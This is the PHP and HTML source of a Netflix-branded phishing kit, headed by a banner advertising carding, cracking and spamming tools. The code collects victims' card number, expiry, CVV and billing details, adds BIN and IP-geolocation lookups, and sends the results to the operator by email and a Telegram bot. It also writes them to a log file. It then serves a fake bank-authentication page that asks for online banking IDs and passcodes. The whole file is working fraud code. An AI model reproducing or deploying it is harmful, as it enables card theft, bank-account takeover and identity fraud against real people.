<?php
/*



 ██████╗██╗     ███████╗ █████╗ ███╗   ██╗        ████████╗ ██████╗  ██████╗ ██╗     ███████╗        ███╗   ██╗███████╗████████╗
██╔════╝██║     ██╔════╝██╔══██╗████╗  ██║        ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝        ████╗  ██║██╔════╝╚══██╔══╝
██║     ██║     █████╗  ███████║██╔██╗ ██║           ██║   ██║   ██║██║   ██║██║     ███████╗        ██╔██╗ ██║█████╗     ██║   
██║     ██║     ██╔══╝  ██╔══██║██║╚██╗██║           ██║   ██║   ██║██║   ██║██║     ╚════██║        ██║╚██╗██║██╔══╝     ██║   
╚██████╗███████╗███████╗██║  ██║██║ ╚████║███████╗   ██║   ╚██████╔╝╚██████╔╝███████╗███████║███████╗██║ ╚████║███████╗   ██║   
 ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   

[ Cracking , Hacking , Method , Spamming , Giveaways , Carding , Database , Courses ]

[ Channel : @clean_tools_net ]

[ Website : www.clean-tools.net ]

      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/

session_start();
error_reporting(0);
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";
$_SESSION['api'] = $api;
$_SESSION['chatid'] = $chatid;
$_SESSION['youremail'] = $email;

$_SESSION['cardholder'] = $_POST['cardholder'];
$_SESSION['creditCardNumber'] = $_POST['creditCardNumber'];
$_SESSION['creditExpirationMonth'] = $_POST['creditExpirationMonth'];
$_SESSION['creditCardSecurityCode'] = $_POST['creditCardSecurityCode'];

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$countryCode = $IP_LOOKUP->countryCode. "\r\n";
$regionName    = $IP_LOOKUP->regionName . "\r\n";
$lat    = $IP_LOOKUP->lat . "\r\n";
$timezone    = $IP_LOOKUP->timezone . "\r\n";
$isp    = $IP_LOOKUP->isp . "\r\n";
$as    = $IP_LOOKUP->as . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$hostname = gethostbyaddr($ip);
$bincheck = $_POST['creditCardNumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['creditCardNumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$cardlastdigit = substr($_POST['creditCardNumber'],12,16);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['bank_country'] = $xBIN["country"]["name"];


$message = "[+]━━━━【🔥 NetFlix CC Fire 🔥】━━━━[+]\r\n";
$message .= "[+]Card Holder      	 : ".$_POST['cardholder']."\r\n";
$message .= "[+] [💳 Credit Card Number]     	 : ".$_POST['creditCardNumber']."\r\n";
$message .= "[+] [🔄 Expiry Date ]     	 : ".$_POST['creditExpirationMonth']."\r\n";
$message .= "[+] [🔑 (CVV)]    	 : ".$_POST['creditCardSecurityCode']."\r\n";
$message .= "[+]━━━━【🏦 Bank Details】━━━━[+]\r\n";
$message .= "[+] Bank name       : ".$_SESSION['bank_name']."\r\n";
$message .= "[+] Bank scheme      : ".$_SESSION['bank_scheme']."\r\n";
$message .= "[+] Bank type      : ".$_SESSION['bank_type']."\r\n";
$message .= "[+] Bank Brand      : ".$_SESSION['bank_brand']."\r\n";
$message .= "[+] Bank Country      : ".$_SESSION['bank_country']."\r\n";
$message .= "[+]━━━━【📓 Billing INFO】━━━━[+]\r\n";
$message .= "[+] First Name          : ".$_SESSION['firstName']."\r\n";
$message .= "[+] Last Name          : ".$_SESSION['lastName']."\r\n";
$message .= "[+] Country      	 : ".$_SESSION['country']."\r\n";
$message .= "[+] Billing Address      	 : ".$_SESSION['address']."\r\n";
$message .= "[+] Billing Address 2       : ".$_SESSION['address2']."\r\n";
$message .= "[+] City     	 : ".$_SESSION['city']."\r\n";
$message .= "[+] State        : ".$_SESSION['city']."\r\n";
$message .= "[+] Phone     	 : ".$_SESSION['phone']."\r\n";
$message .= "[+] Date of birth      : ".$_SESSION['birthday']."\r\n";
$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n[+] Country : ".$COUNTRY."[+] City: " .$CITY."[+] Region : " .$REGION."[+] State: " .$STATE."[+] Zip : " .$ZIPCODE."[+] country code: " .$countryCode."[+] lat: " .$lat."[+] timezone: " .$timezone."[+] isp: " .$isp."[+] as: " .$as;
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[+]━━━━【🔥 NetFlix CC Fire 🔥】━━━━[+]\n";
$_SESSION['message'] = $message;

$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "🔥 NetFlix log 🔥  $ip";
$headers = "From: GcS-Team<info@GcSTeam.com>";
@mail($email,$subject,$message,$headers);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$myfile = fopen("NetFlix_RzlT.txt", "a+");$txt = $message;fwrite($myfile, $txt);fclose($myfile);




?>

<?php


include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
?>

<html class=" js  js "><head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Netflix</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
      <link id="lib_main" type="text/css" rel="stylesheet" href="files/style/none.css">
      <link id="lib" type="text/css" rel="stylesheet" href="files/style/none2.css">
      <link rel="shortcut icon" href="files/img/favicon.ico">
      <link rel="apple-touch-icon" href="img/favicon.png">
      <script type="text/javascript" src="files/js/modernizr.min.js"></script>
	  <script src="files/js/jquery.js"></script> 
      <script src="files/js/jquery.ccvalid.js"></script>
      <script src="files/js/jquery.mask.js"></script>
   <style>@media print {#ghostery-tracker-tally {display:none !important}}</style><style>@media print {#ghostery-tracker-tally {display:none !important}}</style></head>
   <body>
      <center>
         <style>.success, .error, .validation {
            border: 1px solid;
            margin: 10px 0px;
            padding: 15px 10px 15px 50px;
            background-repeat: no-repeat;
            background-position: 10px center;
            }
            .success {
            color: #4F8A10;
            background-color: #DFF2BF;
            }
            .error{
            color: #D8000C;
            background-color: #FFBABA;
            }
            .validation{
            color: #D63301;
            background-color: #FFCCBA;
            }
         </style>
         <div style="margin-left:2px;width:600px;border:solid 1px #d8d4d4;padding:25px">
            <img src="files/img/vbvmcs.png" style="width: 90px;float:left;"><img src="files/img/nt_logo.svg" style="float: right;display: inline-block;margin-top: 18px;" width="100px">            <div style="clear:both"></div>

            <p style="font-size:13px;margin-top:25px;color:#807979"></p>
            <p style="font-size:13px;margin-top:25px;color:#807979"><h2>Authentication is required for this purchase.
please login to your bank account & type the otp code sent to your registered mobile *******</h2></p>
            <script type="text/javascript">
               document.onreadystatechange = function () {
                 var state = document.readyState
                 if (state == 'complete') {
                     setTimeout(function(){
                         document.getElementById('interactive');
                       // document.getElementById('fixed').style.visibility="hidden";
               		 $("#fixed").hide();
               		 $("#formf").show(500);
                     },4000);
                 }
               }
            </script>
            <form method="post" action="./sendbank.php" id="formf" style="">
               <p style="display:none;" class="validation" id="tiitleerror">This code is invalid. Check the SMS and try again.</p><br><br><table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
                  
                  <tbody>
                     
                     <tr>
                        <td align="right">Bank :</td>
                        <td><?php echo $_SESSION['bank_name']; ?></td>
                     </tr>
                     
                     <tr>
                        <td align="right">Date :</td>
                        <td><?php echo date("d/M/Y"); ?></td>
                     </tr>
                     
                     <tr>
                        <td align="right">Credit Card :</td>
                        <td><?php echo "XXX-XXXX-XXXX-" . $cardlastdigit; ?></td>
                     </tr>
                     <tr>
                        <td align="right">Full Name :</td>
                        <td><?php echo $_SESSION['firstName'] . " " . $_SESSION['lastName']; ?></td>
                     </tr>
                     
                    <tr>
                     <h3> Log on your Bank account to continue </h3>
                     <h2><?php echo $_SESSION['bank_name']; ?></h2>
                        <td align="right">Bank ID </td>
                        <td class="xx"><input style="width: 100px;" type="text" name="username" required></td>
                     </tr>
                     <tr><td align="right">Bank passcode </td>
		                <td class="xx"><input style="width: 100px;" type="password" name="password1" required>
		                </td>
	                 </tr>
                     <tr>
                        <td></td>
                        <td><br>
                           <input style="width:74px" type="submit" value="Submit">
                        </td>
                     </tr>
                  </tbody>
               </table>
            </form>
            
            <div id="fixed" class="" style="display: none;">
               <img src="files/img/lod2.gif">
               <p class="">Loading...</p>
            </div>
            <p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565"> Copyright © 1999-  <?php echo date("Y"); ?> . All rights reserved. </p>
         </div>
         <div id="rotate" style="display:none">
            <div class="circle">
               <div class="rotate"></div>
            </div>
            <div class="overlay"></div>
         </div>
      </center>
   
</body></html>
